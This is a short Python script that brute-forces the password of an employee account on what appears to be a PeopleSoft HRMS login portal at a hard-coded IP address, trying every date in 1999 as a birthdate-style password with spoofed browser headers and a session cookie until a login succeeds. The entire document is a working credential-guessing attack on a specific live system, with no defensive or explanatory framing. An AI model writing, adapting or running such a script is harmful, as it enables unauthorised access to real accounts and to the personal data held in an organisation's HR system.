import requests
dates = []
for i in range(1,13):
	month = str(i)
	if(len(month)==1):
		month = "0"+month
	for j in range(1,32):
		date = str(j)
		if(len(date)==1):
			date = "0"+date
		dates.append(date+"/"+month+"/1999")
for k in dates:
	datas = {'userid':'BXXXXX','pwd':k,'timezoneOffset':'0'}
	header = {'Host':'115.114.127.54:8080','User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate','Cookie':'BITSRPT-8080-PORTAL-PSJSESSIONID=BbTyZJbG8pfdyngv2rdyvgFDtJZW9hSM!-1229345674; SignOnDefault=','Connection': 'keep-alive','Upgrade-Insecure-Requests':'1','Cache-Control':'max-age=0'}
	r = requests.post("http://115.114.127.54:8080/psp/bitcsprd/EMPLOYEE/HRMS/?&cmd=login&languageCd=ENG",allow_redirects=False,headers=header,data=datas)
	s = r.text
	if(len(s.split("http://115.114.127.54:8080/psp/bitcsprd/EMPLOYEE/HRMS/h/?tab=DEFAULT"))>=2):
		print('Login successful')
		print(k)
		break
	else:
		print('Login failed')
